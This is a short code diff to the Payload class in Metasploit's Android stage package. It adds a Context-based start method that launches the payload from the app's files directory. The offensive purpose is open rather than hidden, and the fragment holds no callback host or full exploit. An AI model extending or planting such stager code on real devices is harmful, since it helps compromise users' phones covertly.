@@ -1,5 +1,7 @@
 package com.metasploit.stage;
 
+import android.content.Context;
+
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.File;
@@ -27,6 +29,10 @@ public class Payload {
     private static final Random rnd = new Random();
 
     private static String[] parameters;
+
+    public static void start(Context context) {
+        startInPath(context.getFilesDir().toString());
+    }
 
 	public static void startAsync() {
 		new Thread() {
